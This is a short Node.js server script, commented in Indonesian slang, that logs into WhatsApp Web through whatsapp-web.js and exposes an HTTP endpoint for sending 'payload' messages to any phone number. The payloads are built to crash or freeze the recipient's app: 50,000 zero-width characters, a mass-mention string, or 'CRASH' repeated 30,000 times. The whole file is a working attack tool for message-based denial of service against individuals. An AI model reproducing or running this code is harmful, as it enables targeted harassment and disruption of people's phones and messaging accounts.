// Node.js | server.js | Node.js runtime | target: WhatsApp Web API
const express = require('express');
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    }
});

client.on('qr', (qr) => {
    console.log('\n=========================================');
    console.log('[!] SCAN QR INI PAKE WHATSAPP LO:');
    console.log('=========================================');
    qrcode.generate(qr, { small: true });
});

client.on('ready', () => {
    console.log('[+] BOT SIAP! WhatsApp lo udah nyambung ke server.');
});

app.post('/api/send', async (req, res) => {
    const { target, type } = req.body;
    
    if (!target) return res.status(400).json({ success: false, error: "Nomor kosong" });
    
    const formattedNumber = target.includes('@c.us') ? target : `${target}@c.us`;

    try {
        let payloadText = "";

        if (type === "unicode") {
            payloadText = "\u200B".repeat(50000); 
        } else if (type === "mention") {
            payloadText = "!".repeat(1000) + " @all";
        } else {
            payloadText = "CRASH ".repeat(30000);
        }

        await client.sendMessage(formattedNumber, payloadText);
        
        console.log(`[+] Terkirim ke ${target}`);
        res.json({ success: true, message: "Payload sent" });
        
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Server jalan di port ${PORT}`);
});

client.initialize();
